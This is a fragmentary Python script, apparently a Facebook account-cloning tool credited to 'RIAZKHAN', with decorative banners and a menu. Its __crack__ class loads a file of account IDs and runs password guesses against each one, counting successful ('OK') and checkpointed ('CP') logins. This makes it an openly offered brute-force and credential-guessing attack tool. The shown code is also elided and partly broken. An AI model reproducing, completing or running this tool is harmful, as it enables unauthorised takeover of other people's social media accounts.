import os,sys
try: import requests
except ModuleNotFoundError:print("Abeera Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("Abeera Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("Abeera Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
...
def R():
			os.system("clear")
			logo()
			print("               \033[1;92m♡ CODDED BY ➵ RIAZKHAN ♡ \033[1;92m")
			print (' \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
			print (" [♡] CREDIT \033[1;92m➵ RIAZ-KHAN \033[1;92m")
			print(" [♡] FRIEND  \033[1;92m➵ ABEERA \033[1;92m")
			print (' \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
			print(" [1] Start Cloning(❅。°❆·ABEERA*.❅· °。·❆  ")
			print(" [2] Create File")
			print(" [3] FeedBack")
...
class __crack__:
	...
	def plerr(self):
		try:
			self.apk = input(" [♡] ABEERA FILE DALO ➵ ")
			print (' \033[1;94m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
			self.id = open(self.apk).read().splitlines()
			print(' [♡] Total ID ➵ %s'%(len(self.id)))
			print (' \033[1;94m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
			print('\033[1;34m [♡]\033[1;34m  Please Choose Pass Method\033[1;37m')
			print (' \033[1;94m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
		except:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;94m [RIAZ] %s/%s  \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
...
##     ## ########  ######## ######## ##     ## ##     ## 
\033[1;32m ♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
    Author   ➵ RIAZKHAN(ABEERA NEW FRIEND)
    Facebook ➵ RIAZ(SACH KAHON TO FB KA NAME NAHI)
    Version  ➵ 0.4
 \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
 \033[1;32m                   RIAZKHAN(LOVE YOU ABEERA-XD) \033[1;34m
 \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡"""
ct = datetime.now()
n = ct.month
